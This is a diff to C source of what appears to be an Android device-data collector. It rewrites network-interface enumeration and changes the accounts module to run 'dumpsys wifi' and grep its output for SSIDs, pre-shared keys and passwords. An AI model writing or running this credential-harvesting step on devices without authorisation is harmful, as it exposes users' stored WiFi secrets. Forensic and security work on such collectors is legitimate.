@@ -792,29 +792,33 @@ static int module_network(const char *outdir) {
         }
     }
 
-    /* Network interfaces via ioctl */
+    /* Network interfaces via /sys/class/net/ */
     char ipath[MAX_PATH];
     snprintf(ipath, sizeof(ipath), "%s/interfaces.txt", subdir);
     FILE *if_out = fopen(ipath, "w");
     if (if_out) {
-        struct if_nameindex *ifs = if_nameindex();
-        if (ifs) {
-            for (int i = 0; ifs[i].if_name; i++) {
-                fprintf(if_out, "Interface: %s (idx %d)\n", ifs[i].if_name, ifs[i].if_index);
-                /* Try to read sysfs for details */
+        DIR *nd = opendir("/sys/class/net");
+        if (nd) {
+            struct dirent *ne;
+            while ((ne = readdir(nd)) != NULL) {
+                if (ne->d_name[0] == '.') continue;
+                fprintf(if_out, "Interface: %s\n", ne->d_name);
                 char syspath[MAX_PATH];
-                snprintf(syspath, sizeof(syspath), "/sys/class/net/%s/address", ifs[i].if_name);
+                snprintf(syspath, sizeof(syspath), "/sys/class/net/%s/address", ne->d_name);
                 char *mac = _read_file(syspath);
                 if (mac) { fprintf(if_out, "  MAC: %s", mac); free(mac); }
-                snprintf(syspath, sizeof(syspath), "/sys/class/net/%s/operstate", ifs[i].if_name);
+                snprintf(syspath, sizeof(syspath), "/sys/class/net/%s/operstate", ne->d_name);
                 char *state = _read_file(syspath);
                 if (state) { fprintf(if_out, "  State: %s", state); free(state); }
+                snprintf(syspath, sizeof(syspath), "/sys/class/net/%s/speed", ne->d_name);
+                char *speed = _read_file(syspath);
+                if (speed) { fprintf(if_out, "  Speed: %s", speed); free(speed); }
                 fprintf(if_out, "\n");
             }
-            if_freenameindex(ifs);
+            closedir(nd);
+            count++;
         }
         fclose(if_out);
-        count++;
     }
 
     return count;
@@ -1015,8 +1019,8 @@ static int module_accounts(const char *outdir) {
         }
     }
 
-    /* WiFi (wpa_supplicant via WifiManager cmd) */
-    fp = popen("cmd wifi list-networks 2>/dev/null || true", "r");
+    /* WiFi info via cmd/wifi dumpsys */
+    fp = popen("dumpsys wifi 2>/dev/null | grep -E 'SSID|ssid|Key|PreSharedKey|password' | head -30 || echo '(no wifi credentials accessible)'", "r");
     if (fp) {
         char buf[OUT_BUF];
         size_t r = fread(buf, 1, sizeof(buf) - 1, fp);
